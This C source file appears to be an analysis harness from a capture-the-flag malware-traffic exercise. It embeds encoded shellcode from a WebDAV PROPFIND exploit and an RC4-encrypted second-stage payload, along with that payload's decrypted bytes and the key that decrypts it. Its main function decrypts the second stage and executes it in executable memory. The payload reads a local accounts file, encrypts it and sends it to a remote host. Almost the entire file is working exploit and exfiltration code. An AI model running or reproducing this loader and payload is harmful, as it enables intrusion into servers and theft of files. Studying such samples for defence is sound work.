#include <Windows.h>
#include <stdio.h>

// tcp stream 49, PROPFIND exploit using Alpha2-encoder
// (https://github.com/un4ckn0wl3z/Alpha2-encoder/blob/master/alpha2.c)
wchar_t shellcode1[] =
// url and padding (383 unicode characters)
L"\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x32\x2E\x31\x36\x38\x2E\x36\x38\x2E\x31\x3A\x38\x30\x2F\x6C\x4E\x59\x71\x77\x53\x6C\x57\x67\x4D\x78\x6A\x76\x72\x64\x53\x4D\x6E\x43\x56\x56\x7A\x44\x58\x63\x53\x66\x4D\x45\x41\x58\x59\x50\x50\x62\x4C\x68\x73\x6E\x75\x70\x63\x63\x59\x76\x6B\x72\x4F\x65\x75\x4B\x72\x73\x55\x4C\x6E\x42\x4A\x7A\x68\x6D\x64\x4F\x52\x76\x42\x57\x54\x4D\x44\x6C\x70\x42\x6E\x4A\x56\x54\x79\x57\x50\x4A\x75\x48\x61\x66\x64\x52\x4C\x4F\x70\x54\x58\x4C\x63\x46\xE4\xB5\x84\xE5\x91\xB4\xE6\x95\x82\xE5\x8D\xB7\xE6\xBD\xA6\xE4\xBD\x83\xE5\x95\x8C\xE7\x95\x86\xE7\x95\xAB\xE5\x81\xAF\xE7\x81\x92\xE5\x81\x98\xE4\xB1\x90\xE4\xA9\xB5\xE1\x8F\x80\xE6\xA0\x83\xEF\x8E\x8D\xE7\x9E\xBD\xE7\x95\x94\xE6\x89\xA3\xE5\x8D\xB5\xE4\xB1\x89\xE1\x8F\x80\xE6\xA0\x83\xE4\xA1\x88\xE7\x89\xB0\xE6\xA5\x84\xE6\xA1\xA6\xE5\xA5\x92\xE6\xA1\x95\xE6\x85\x84\xE6\xBD\x99\xE6\x82\x82\xE6\xA0\x81\xEB\x81\xAC\xE7\x9E\xBC\xEF\x80\x81\xE7\x9E\xBE\xE2\x95\xA3\xE7\x9E\xBB\xE1\x84\x94\xE7\x9E\xBA\xEF\x89\x84\xE7\x9E\xBB\xE4\x85\x81\xE4\x85\x81\xEE\xB8\xA2\xE7\x9E\xBB\xE9\xA0\x81\xE7\x9E\xBC\xE2\x89\xA5\xE7\x9E\xBE\xE2\x95\xA3\xE7\x9E\xBB\xE9\x91\xAF\xCF\x80\xED\x91\x81\xE7\x9E\xBD\xE4\xA3\x93\xE7\x9E\xBB\xE2\x87\xA0\xE7\x9E\xBF\xEF\x84\x82\xE7\x9E\xBB\xEF\xB0\x82\xE7\x9E\xBB\xEF\x80\x81\xE7\x9E\xBE\xE8\xB0\x84\xE7\x9E\xBD\xE8\xB0\x85\xE7\x9E\xBD\xE2\x95\xA3\xE7\x9E\xBB\xE9\x91\x8F\xCF\x80\xED\x91\x81\xE7\x9E\xBD\xE8\x8A\x85\xE7\x9E\xBB\xE2\x95\xA3\xE7\x9E\xBB\xE9\x82\x90\xE9\x82\x90\xE6\x96\x91\xE7\x9E\xBE\xE5\xB9\x94\xEC\x9A\x83\xE4\x84\x8A"
// Alpha2 command -> mixedcase unicode, esi contains the baseaddress
L"VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA"
// shellcode 1
L"jXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBYlHharm0ipIpS0u9iUMaY0qTtKB0NPRkqBLLBkPRMDbksBlhlOwGMzmVNQkOTlmlQQqllBLlMPGQVoZmjaFgXbIbr2NwRk1BzpDKmzOLtKPLjqqhJCa8za8QPQtKaImPIqgctKMyZxk3MjniRkMddKM16vnQYoVLfaXOjm9quwP8Wp0ul6LCqm9hOKamNDCEGtnxBkOhMTKQVs2FtKLLPKdKNxKlYqZ3tKLDDKYqXPdIq4nDnDokqKS1pY1Jb1yoK0Oo1OQJbkZrHkrmaMbHLsLrYpkPBHRWrSlraO1DS8nlbWmVkW9oHUtxV0M1IpypKyi4Ntb0bHNIu00kypioIENpNpPP201020a0npS8xjLOGogpIoweF7PjkUS8Upw814n5PhLBipjqqLriXfqZlPr6b7ph3iteadqQKOweCUEpd4JlYopN9xbUHl0hzPWEVBR6yofu0j9pQZkTqFR7oxKRyIfhoo9oHUDKp63QZVpKqH0OnrbmlN2JmpoxM0N0ypKP0QRJipphpX6D0Sk5ioGeBmDX9pkQ9pM0r3R6pPBJKP0Vb3B738KRxYFh1OIoHU9qUsNIUv1ehnQKqIomr5Og4IYOgxLPkPM0yp0kS9RLplaUT22V2UBLD4RUqbs5LqMbOC1Np1gPdjkNUpBU9k1q8oypm19pM0NQyK9rmL9wsYersPK2LOjbklmF4JztkWDFjtmObhMDIwyn90SE7xMa7kKN7PYrmLywcZN4IwSVZtMOqxlTLGIrn4ko1zKdn7P0B5IppEmyBUjEaOUsAA";

// acquired from shellcode1 after it unpacks itself, at shellcode_base+1E5 (loc_1D6)
const unsigned long SHELLCODE1_MAGIC = 0x524F584B;
const unsigned char SHELLCODE1_KEY[] = "killervulture123";


// tcp stream 50, encrypted shellcode
char shellcode2[] =
// (1243 bytes)
// the first 4 bytes are used to calculate the size,
// the rest (1239 bytes) are the shellcode
"\x9C\x5C\x4F\x52\xA4\xB1\x03\x73\x90\xE4\xC8\x8E\x97\xB0\xC9\x5B\xC6\x30\xDC\x6A\xBD\xF4\x20\x38\x86\xF9\x30\x26\xAF\xED\xD0\x88\x1B\x92\x4F\xE5\x09\xCD\x5C\x2E\xF5\xE1\x68\xF8\x08\x2B\x48\xDA\xF7\x59\x9A\xD4\xBB\x92\x19\xAE\x10\x7B\x6E\xED\x7B\x6D\xB1\x85\x4D\x10\x31\xD2\x8A\x4E\x7F\x26\x8B\x10\xFD\xF4\x1C\xC1\x7F\xAB\x5A\x73\x92\x02\xC0\xCB\x49\xD9\x53\xD6\xDF\x6C\x03\x81\xA0\x21\x01\x6E\x87\x5F\x09\xFE\x9A\x69\x94\x35\x84\x4F\x01\x96\x6E\x77\xEC\xA3\xF3\xF5\x2F\x6A\x36\x36\xAB\x47\x75\xB5\x80\xCB\x47\xBD\x9F\x76\x38\xA5\x40\x48\x57\x9C\x36\xAD\x8E\x79\x45\xA3\x20\xFA\xED\x1F\x18\x49\xB8\x89\x18\x48\x2B\x5B\x6F\xEE\xF4\xC3\xD6\xDC\xCC\x84\xEA\xB1\x01\x09\xB1\x31\x4B\xA4\x05\x50\x98\xB0\x73\xAE\x9C\x14\x10\x1B\x65\xBD\x93\x82\x6C\x57\xB9\x75\x7A\x2A\xEE\xDE\x10\xFB\x39\xBA\x96\xD0\x36\x1F\xC2\x31\x2C\xC5\x4F\x33\xA5\x13\xE1\x59\x56\x92\xC5\x1F\xA5\x4E\x0E\x62\x6E\xDB\x5B\xE8\x7F\x8D\x01\xA6\x7D\x01\x2B\x02\x43\x1F\x54\xB9\xBC\xD5\xEF\x2D\xB3\xDA\xEF\x3D\xD0\x68\xFE\xDA\xDE\x60\xB1\x17\xFE\xEA\x20\x4A\x2C\xA1\xBB\xA1\xB5\xC5\x12\x92\xA9\xDB\xF1\x11\xE3\x8C\x58\xBA\xDC\x3D\x28\x86\x66\xC8\x6D\x0E\xAB\xFA\x83\xD5\x24\x60\x10\x68\x1D\xC7\xAF\xC7\xAC\x45\x13\xA3\xD9\x72\xE7\xCC\x51\x79\xF5\x67\x41\x7C\xAE\x7F\xC8\x7E\x95\x46\x09\xF6\xEF\x4B\x45\x02\x74\x52\x10\x50\x1C\xB7\x6A\x7C\xEB\x00\xD7\x59\xC3\x29\x02\x37\xD0\x47\x2E\x1E\x3A\xF7\xE6\xAC\x82\x14\x74\xEB\x4F\x6B\x57\x22\x13\xF6\xF2\x48\xD6\x6B\xCB\xB4\xED\xA7\x32\x68\xCB\xD0\x66\x42\xD3\xC5\xF2\xC5\x37\xDF\x7D\x9F\x9F\x28\xC0\x74\x3A\xBE\xB8\xC0\xA7\x73\xD0\xBB\xFA\x50\x7C\x10\x1E\xDA\xB1\x23\xD6\xC4\x81\xA5\xD3\xB6\x22\x29\x09\x6B\x21\xA6\x5C\x38\xC6\x80\x3D\xBE\x08\x23\xC7\xB1\x1F\x6D\xE6\x64\x66\x95\xDC\x10\xA7\x13\x42\xCD\x3B\xFA\xDC\xDA\x14\x8D\xD0\x5A\xC8\x81\x35\x54\x2F\xB5\xDC\x61\xD6\x28\x77\x88\xC5\x58\x70\xB5\x2F\xCF\xEA\x4F\x4D\x85\x56\x04\x07\xF3\x90\x74\xCE\x5D\x3C\x8A\x2B\x06\xB4\x9F\xE6\x6D\x79\xC0\x6E\x3D\xD8\x3E\x20\x08\xB7\x74\x3D\x36\x99\xCD\x7F\x60\x7D\x9C\xC9\xB3\xAD\x0C\x8E\x45\x6D\xEA\x3D\xDD\x09\x1D\xDA\x0B\x3A\x1C\xFC\xCB\x81\x48\xED\x5A\xFA\xCE\xF8\xC6\x23\xB0\x1E\x26\x44\xA3\xD9\xAB\x0E\xD5\x98\xB1\x33\x65\x5D\xED\x6A\xD3\x23\x7F\x02\x4A\xB3\xA2\xF8\x1D\x7E\xD1\x2F\x5F\xBE\x89\x61\x5E\x2C\xE4\xB8\x96\x19\xE5\x49\x76\x4E\x7A\xE8\x92\xA3\x70\x55\x6F\x7D\x3C\xF9\xC1\x36\x44\x69\x33\x7D\xDF\x79\x37\xB8\xE0\xAA\xE8\x6A\x5D\xC9\x3B\x18\x0F\x4E\x28\x3A\x31\xA8\x7F\xEF\xB8\x19\xAC\x36\x63\xE8\x89\x21\x4D\x83\xA7\x7E\x57\x03\x48\x9B\xE1\x27\x93\x06\xE4\x3B\x67\x5F\xE5\x69\x50\x00\x3E\x8B\x01\xB7\xEF\xA6\xB5\x4B\x36\x82\xD4\xFB\x9F\xDE\x8B\x27\xCC\xA4\x57\xCE\x25\x37\x44\x50\x42\xF7\x7E\xA2\xBF\x4F\xDF\x0F\x72\xD8\x66\x4A\x3E\xF5\xC8\x26\x2A\xC5\x88\x7B\x97\xAB\x23\x5B\x2B\x61\xD8\x3F\x00\x37\x0E\x7E\x14\xFA\xFD\x7D\xF7\x81\x49\xC2\xA1\x85\x1B\xD0\x28\xBE\xA5\x24\xFD\x60\xB2\x78\x27\x4E\xAC\xE8\x79\x3B\x3B\x7A\xDC\x56\xD0\x76\xC5\x01\x0F\xCF\x43\xB5\xD4\x5F\x48\x70\xBD\xAC\x65\x76\xDB\x11\x3B\x5B\xCF\x9C\x52\x8B\x00\x1E\x83\xF1\xFA\x92\x5B\x77\x79\x07\x6A\xE0\xD4\x33\x9A\x71\xBA\x24\xA5\xA5\xC8\xEB\x4C\x01\xB3\xD3\xCD\x2C\x22\x8C\x0B\x4C\xCD\x2D\x5A\x8C\x9A\xB1\x67\x70\x7F\x75\x96\xE2\x56\xC1\x1D\xFF\x05\x7E\x77\xA2\xBA\xE5\x9A\xAE\xF9\xF8\xB2\xF1\x78\xD2\xB1\xDC\xE9\x03\xC2\xD4\xFF\x1F\x66\xCD\xB0\x47\xF0\xB4\xD1\xF6\x72\xFA\x1E\xB7\xF1\x4D\xE7\x6E\x42\x10\xEC\x5D\x94\x30\xDD\x7F\x75\x1C\x01\x45\x46\xB6\x14\x6C\xF7\x45\x36\x58\xEC\xEF\xF3\x37\x04\x9C\x21\xEB\x94\x54\xA3\xFE\x23\xCB\xBB\x31\x5C\x62\x75\xBD\xED\x27\x90\xFE\x91\x17\xE2\xAE\x42\x9B\x79\x04\xD1\x5C\xEF\xCD\x4B\x86\x93\x4A\x74\x41\x2D\xAD\x0B\x35\x1D\x81\xFD\x10\x2C\x8E\xFD\x8C\x68\x1D\xF5\x45\x0A\xB5\xB4\x09\xBE\x0E\xFA\xFA\xD2\xF7\x4E\x58\xD8\x3C\x1A\x1B\x11\x3D\x99\x25\x53\xAB\x78\xAC\x54\x49\xBB\x2A\x42\xB3\x80\x66\xB5\x63\xE2\x90\xF8\xA5\x8F\x37\xAF\x97\x13\x2B\xE8\xFC\x5D\x4B\x71\x8B\x4D\x9F\xC8\xEC\x07\x28\x1F\xCB\x30\x92\x1E\x6D\xDC\xB9\xDE\x94\xB8\xE9\xCB\x5A\xF7\xA2\xB0\xBB\x0F\xC3\x38\xB7\x27\x33\x1B\xE9\xBF\x45\x2D\x86\x3E\x34\x6D\x12\xF6\x05\x12\x27\xC5\x28\xE4\xD2\x61\x26\x7E\x99\x2B\x3F\x1F\x03\x4D\x79\x72\xB9\x83\x56\x6D\x8E\x82\x33\xC2\x09\xEB\x21\x4A\x0C\x13\xAD\xEA\x29\x1B\x58\xDA\x10\x16\x43\x20\x55\x7D\xF4\xB7\xFC\x26\x34\x68\x8B\xA0\x54\xAF\x07\xD5\xD5\x23\xB5\x23\xB8\xFB\x07\xC6\x64\x4A\x56\x7F\xA0\x6D\x86\x7C\x33\x3B\x23\xB7\x9D\x9C\xA8\x22\xB1\x79\x9F\x00\xE7\x76\xE9\xC7\x68\xAE\x5C\x23\xAE\x9F\xC6\x45\x91\x48\x83\x6F\xBF\x0A\xD8\xC9\x77\xAB\x2C\x2D\x85\x47\xBF\xE9\x81\x80\x13\xD9\xDC\x1C\x21\x0F\xF4\xC7\x79\x07\x52\xA8\x06\x8C\x57\x63\x53\xB2\xFB\x7D\xBE\x6C\x1A\xAE\x2E\xBD\xC6\xFD\x97\x0A\x04\xED\xC0\xA3\x05\x45\xDB\x9B\x62\xBD\x34\xA9\x08\x25\x53\x00\x90\x36\xCF\xD9\x63\x15\xA5\xF7\xF8\xE0\xD8\x69\xFD\x79\x24\x60\x7B\xA2\xAE\xBD\xF2\xB4\xB9\xC2\x08\x84\x65\xA9\x6D\xEB\xA5\xD8\x72\xA7\xB6\x59\x21\xB9\xF4\x11\x12\x5D\x39\x1D\x15\x75\x6D\x8A\x2F\x58\xC2\xFC\x80\x02\x51\x78\xA9\xFC\x7D\xDE\x0D\x85\xA5\x57\x18\xF8\xF0\xCC\x8E\x4C\x5E\xD7\x65\x58\x74\x4E\x8A\x44\x33\xA2\x24\xE3\x56\x57\x68\xBA\xBB\xF2\xB2\x32\x98\xF1\x88\x2E\xC3";

// decrypted shellcode2 (1239 bytes)
// "\x8B\xEC\x8D\x64\x24\xEC\xE8\x00\x00\x00\x00\x58\x8D\x40\xF5\x89\x45\xF8\x8B\x45\xF8\x8D\x80\x6D\x04\x00\x00\x89\x45\xEC\x8B\x45\xF8\x8D\x80\x79\x04\x00\x00\x89\x45\xF0\x6A\x00\x8F\x45\xF4\x8B\x45\xF8\x8D\x80\x8D\x04\x00\x00\x8D\x18\x8D\x75\xEC\xEB\x12\xE8\x4B\x03\x00\x00\x50\x8B\x45\xF8\x8D\x88\x6D\x04\x00\x00\xFF\x51\x04\x8B\x06\x83\xF8\x00\x74\xE7\x8B\xC3\x83\xC3\x04\x8B\x00\x89\x45\xFC\x33\xFF\x8B\x0B\x8B\x45\xFC\x8B\xD1\xE8\x81\x01\x00\x00\x8B\xD0\x83\xFA\x00\x74\x02\xEB\x05\x83\xC6\x04\xEB\xD3\x8B\x06\x8B\xCF\x83\xC7\x01\x8D\x04\x88\x89\x10\x83\xC3\x04\xEB\xD5\x53\x56\x57\x55\x8B\xEC\x8D\x64\x24\xF4\x89\x45\xF8\x8B\xFA\x89\x4D\xFC\x33\xDB\x8B\x45\xFC\x3B\xD8\x72\x02\xEB\x23\x8B\xF7\x03\xF3\x8B\xC7\x03\xC3\x8A\x00\x88\x45\xF4\x8B\x45\xF8\xE8\xAA\x00\x00\x00\x8A\xC8\x8A\x45\xF4\x32\xC1\x88\x06\x83\xC3\x01\xEB\xD4\xC9\x5F\x5E\x5B\xC3\x53\x56\x57\x55\x8B\xEC\x8D\x64\x24\xF8\x8B\xD8\x89\x55\xFC\x8B\xF9\x33\xC9\x81\xF9\x00\x01\x00\x00\x72\x02\xEB\x0F\x8B\xC3\x8B\xD0\x03\xD1\x8B\xC1\x88\x02\x83\xC1\x01\xEB\xE7\x33\xF6\x33\xC9\x81\xF9\x00\x01\x00\x00\x72\x02\xEB\x4A\x33\xD2\x8B\xC1\xF7\xF7\x8B\x45\xFC\x03\xC2\x8A\x00\x0F\xB6\xC0\x03\xF0\x8B\xC3\x03\xC1\x8A\x00\x0F\xB6\xC0\x03\xF0\x81\xE6\xFF\x00\x00\x00\x8B\xC3\x03\xC1\x8A\x00\x88\x45\xF8\x8B\xC3\x8B\xD0\x03\xD1\x8B\xC3\x03\xC6\x8A\x00\x88\x02\x8B\xC3\x8B\xD0\x03\xD6\x8A\x45\xF8\x88\x02\x83\xC1\x01\xEB\xAC\xC6\x83\x00\x01\x00\x00\x00\xC6\x83\x01\x01\x00\x00\x00\xC9\x5F\x5E\x5B\xC3\x53\x56\x57\x55\x8B\xEC\x8D\x64\x24\xFC\x8B\xD0\x8A\x8A\x00\x01\x00\x00\x8A\x9A\x01\x01\x00\x00\x80\xC1\x01\x8B\xC2\x0F\xB6\xF1\x03\xC6\x8A\x00\x02\xD8\x88\x8A\x00\x01\x00\x00\x88\x9A\x01\x01\x00\x00\x8B\xC2\x0F\xB6\xF3\x03\xC6\x8A\x00\x88\x45\xFD\x8B\xC2\x8B\xF0\x0F\xB6\xC3\x03\xF0\x8B\xC2\x0F\xB6\xF9\x03\xC7\x8A\x00\x88\x45\xFC\x8A\x45\xFC\x88\x06\x8B\xC2\x8B\xF0\x0F\xB6\xC1\x03\xF0\x8A\x45\xFD\x88\x06\x8B\xC2\x8D\x30\x8D\x02\x0F\xB6\xCB\x03\xC1\x8A\x08\x8A\x45\xFD\x02\xC1\x24\xFF\x0F\xB6\xC0\x03\xF0\x8A\x06\xC9\x5F\x5E\x5B\xC3\x53\x56\x57\x55\x8B\xEC\x8D\x64\x24\xF0\x89\x45\xF8\x89\x55\xFC\x64\xA1\x30\x00\x00\x00\x8B\x40\x0C\x8B\x48\x0C\x8B\x41\x18\x83\xF8\x00\x74\x0D\xEB\x04\x8B\x09\xEB\xF2\x33\xD2\x66\x33\xDB\xEB\x07\x33\xC0\xC9\x5F\x5E\x5B\xC3\x66\x8B\x41\x2C\x66\x3B\xD8\x72\x08\xEB\x26\x66\x83\xC3\x02\xEB\xEF\x8B\xF2\xC1\xEE\x0D\xC1\xE2\x13\x0B\xF2\x8B\xD6\x8B\x41\x30\x0F\xB7\xF3\x03\xC6\x8A\x00\x0F\xBE\xC0\x83\xF8\x61\x72\x12\xEB\x09\x8B\x45\xF8\x3B\xC2\x74\x0D\xEB\xB4\x83\xE8\x20\x03\xD0\xEB\xCA\x03\xD0\xEB\xC6\x8B\x59\x18\x8B\x43\x3C\x8B\xD3\x03\xD0\x8B\x42\x78\x8B\xD3\x03\xD0\x8B\xC2\x89\x45\xF4\x33\xD2\x8B\x45\xF4\x8B\x40\x18\x3B\xD0\x72\x07\xEB\x85\x83\xC2\x01\xEB\xEF\x8B\x45\xF4\x8B\x40\x20\x8B\xF3\x03\xF0\x8B\xC6\x8D\x04\x90\x8B\x00\x8B\xFB\x03\xF8\x33\xF6\x8B\xC7\x83\xC7\x01\x8A\x00\x0F\xBE\xC0\x89\x45\xF0\x8B\x45\xF0\x83\xF8\x00\x74\x02\xEB\x09\x8B\x45\xFC\x3B\xC6\x74\x15\xEB\xC4\x8B\xC6\xC1\xE8\x0D\xC1\xE6\x13\x0B\xC6\x8B\xF0\x8B\x45\xF0\x03\xF0\xEB\xCD\x8B\x45\xF4\x8B\x40\x1C\x8B\xCB\x03\xC8\x8B\x45\xF4\x8B\x40\x24\x8B\xF3\x03\xF0\x8B\xC6\x8D\x04\x50\x66\x8B\x00\x0F\xB7\xC0\x8D\x04\x81\x8B\x00\x03\xD8\x8B\xC3\xC9\x5F\x5E\x5B\xC3\x53\x56\x57\x55\x8B\xEC\x8D\x64\x24\xE8\x89\x45\xF8\x89\x55\xFC\xE8\x00\x00\x00\x00\x5E\x8D\xB6\xDD\xFC\xFF\xFF\x6A\x06\x6A\x01\x6A\x02\x8D\x86\x79\x04\x00\x00\xFF\x50\x10\x8B\xD8\x83\xFB\x00\x7C\x02\xEB\x07\x8B\xC3\xC9\x5F\x5E\x5B\xC3\x8D\x7D\xE8\x32\xC0\x6A\x10\x59\xF3\xAA\x66\xC7\x45\xE8\x02\x00\x8B\x45\xFC\x66\xC1\xC0\x08\x66\x89\x45\xEA\x8B\x45\xF8\x0F\xC8\x89\x45\xEC\x8D\x45\xE8\x6A\x10\x50\x53\x8D\x86\x79\x04\x00\x00\xFF\x50\x04\x83\xF8\x00\x7C\x02\xEB\x05\xC9\x5F\x5E\x5B\xC3\x8B\xC3\xC9\x5F\x5E\x5B\xC3\x53\x56\x57\x55\x8B\xEC\x8D\xA4\x24\x68\xFC\xFF\xFF\xE8\x00\x00\x00\x00\x5E\x8D\xB6\x5F\xFC\xFF\xFF\x8D\x86\xB9\x04\x00\x00\x6A\x00\x6A\x00\x6A\x03\x6A\x00\x6A\x01\x68\x00\x00\x00\x80\x50\x8D\x86\x6D\x04\x00\x00\xFF\x10\x8B\xD0\x8D\x8D\x68\xFC\xFF\xFF\x8D\x85\x68\xFD\xFF\xFF\x6A\x00\x50\x68\x00\x01\x00\x00\x51\x52\x8D\x86\x6D\x04\x00\x00\xFF\x50\x08\x8D\x86\xC9\x04\x00\x00\x8D\x10\x8D\x9D\x6C\xFD\xFF\xFF\x8B\xFA\x32\xC0\x33\xC9\x49\xF2\xAE\xF7\xD1\x49\x8B\xC3\xE8\xCC\xFC\xFF\xFF\x8D\x85\x6C\xFD\xFF\xFF\x8D\x95\x68\xFC\xFF\xFF\x8B\x8D\x68\xFD\xFF\xFF\xE8\x70\xFC\xFF\xFF\x8D\x85\x70\xFE\xFF\xFF\x50\x68\x02\x02\x00\x00\x8D\x86\x79\x04\x00\x00\xFF\x10\xB8\x15\x44\xA8\xC0\x66\xBA\x39\x05\xE8\xCD\xFE\xFF\xFF\x8B\xD8\x8D\x85\x68\xFC\xFF\xFF\x6A\x00\xFF\xB5\x68\xFD\xFF\xFF\x50\x53\x8D\x86\x79\x04\x00\x00\xFF\x50\x08\x6A\x02\x53\x8D\x86\x79\x04\x00\x00\xFF\x50\x0C\xC9\x5F\x5E\x5B\xC3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x17\xCA\x2B\x6E\xA5\x17\x00\x7C\x7E\xD8\xE2\x73\x16\x65\xFA\x10\xA6\xEF\xE1\x32\xCB\xED\xFC\x3B\xEC\xF9\xAA\x60\xA4\x19\x70\xE9\xC9\x6A\x5F\x4D\x6E\x0B\x2F\x49\x00\x00\x00\x00\x43\x3A\x5C\x61\x63\x63\x6F\x75\x6E\x74\x73\x2E\x74\x78\x74\x00\x69\x6E\x74\x72\x65\x70\x69\x64\x6D\x61\x6E\x67\x6F\x00";

__declspec(dllexport)
int main()
{
	void (*func)();
	wchar_t *shellcode;

	unsigned char key[256];
	int i;
	unsigned int decode1;
	unsigned int decode2;
	unsigned int decode3;

	size_t shellcode2_size;

	// ALLOCATE SHELLCODE MEMORY
	shellcode = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if(!shellcode)
	{
		printf("Could not allocate shellcode\n");
		ExitProcess(-1);
	}
	printf("shellcode: %p", shellcode);


	// RUN SHELLCODE1
	// CopyMemory(shellcode, shellcode1, wcslen(shellcode1) * sizeof(wchar_t));
	// func = (void (*)()) (shellcode + 383);
	// __asm
	// {
	//     // the shellcode requires esi to equal its own baseaddress
	//     mov esi, [ebp-8]
	// }
	// func();



	// DECRYPT SHELLCODE2
	for(i = 0;i <= 0xFF;i++)
		key[i] = i;

	decode1 = 0;
	for(i = 0;i <= 0xFF;i++)
	{
		decode1 += key[i];
		decode1 += SHELLCODE1_KEY[i & 0xF];

		decode2 = key[decode1 & 0xFF];
		key[decode1 & 0xFF] = key[i & 0xFF];
		key[i & 0xFF] = decode2;
	}

	decode1 = 0;
	shellcode2_size = SHELLCODE1_MAGIC ^ *(unsigned long *) shellcode2;
	for(i = 1;i <= shellcode2_size;i++)
	{
		decode1 = (decode1 + key[i & 0xFF]) & 0xFF;
		decode2 = key[i & 0xFF];
		decode3 = key[decode1];
	
		key[decode1] = decode2;
		key[i & 0xFF] = decode3;
		decode3 = (decode3 + key[decode1]) & 0xFF;
	
		shellcode2[i + 3] ^= key[decode3];
	}

	// RUN SHELLCODE2
	CopyMemory(shellcode, shellcode2 + 4, 1239);
	func = (void (*)()) shellcode;
	func();
}
